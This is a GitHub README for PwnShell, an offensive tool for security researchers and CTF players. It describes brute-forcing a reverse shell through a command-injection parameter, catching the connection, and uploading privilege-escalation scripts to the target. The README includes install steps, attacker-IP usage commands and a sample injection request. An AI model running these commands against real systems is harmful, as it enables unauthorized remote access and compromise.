

# PwnShell

### PwnShell is a Powerfull RevShell Bruteforcer and Connection Handler built For Security Researchers and CTF Players!
<details>
    <ol>
    <li><div>Bruteforces the Vulnerable Parameter</div></li>
    <li><div>Recieve and Handle the Connection</div></li>
    <li><div>Downloads Post exploitation scripts from their Repos.</div></li>
    <li><div>Uploads them to target</div></li>
    <li><div>Activates a TTY shell using Python3 </div></li>
    <li><div>Enjoy!</div></li>
  </ol>
</details>

![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/PwnShell.png)

## Navigation:
   <ol>
    <li><a href="#installation">Installation</a></li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgements">Acknowledgements</a></li>
  </ol>

## Installation:

1. Clone the repo
   ```sh
   git clone https://github.com/zAbuQasem/PwnShell
   ```
2. Install the dependencies
   ```sh
   cd PwnShell/
   pip3 install -r requirements.txt
   ```
3. Make the script executable 
   ```sh
   chmod +x pwnshell.py
   ```

<!-- USAGE EXAMPLES -->
## Usage:
### Request-File Method [Recommended] 👇
```sh
./pwnshell.py -i [Attacker-IP] -f [REQUEST FILE] -s (To use https prefix)
```
#### Example:
-Copy from Burp or Network tab

-Replace the Vulnerable place in the parameter with 'PWNME'
```sh
GET /Vulnerable.php?cmd=PWNME HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
### URL Method 👇
```sh
./pwnshell.py -i [Attacker-IP] -p [Attacker-Port] -u [TARGET-URL] -m [REQUEST-METHOD] -c [COOKIES (optional)] -H [HEADERS (optional)]

#Note: Cookie and headers must be in JSON format (if provided).
   ```
```sh
./pwnshell.py -i [Attacker-IP] -u http/s://<TARGET>/vulnerable.php?cmd=PWNME --method GET --cookies '{"key" : "value"}' 
```
#### Example:
-Replace the Vulnerable place in the parameter with 'PWNME'
```sh

./pwnshell.py -H 127.0.0.1 -u http://10.10.10.10/vulnerable.php?cmd=PWNME
```

## Preview:
### Using [Request-File Method]
![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/requestfile-demo.gif)

### Using [URL Method]
![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/url-demo.gif)


<!-- CONTACT -->
## Contact:

**Zeyad AbuQasem** - [LinkedIn](https://www.linkedin.com/in/zeyad-abuqasem/)

**Omar Albalouli** - [LinkedIn](https://www.linkedin.com/in/omar-albalouli/) & [Github](https://github.com/omaralbalolly)

<!-- ACKNOWLEDGEMENTS -->
## Acknowledgements:
* [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
* [Docker Privesc Script](https://github.com/flast101/docker-privesc)
* [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
* [Burpee](https://github.com/xscorp/Burpee)
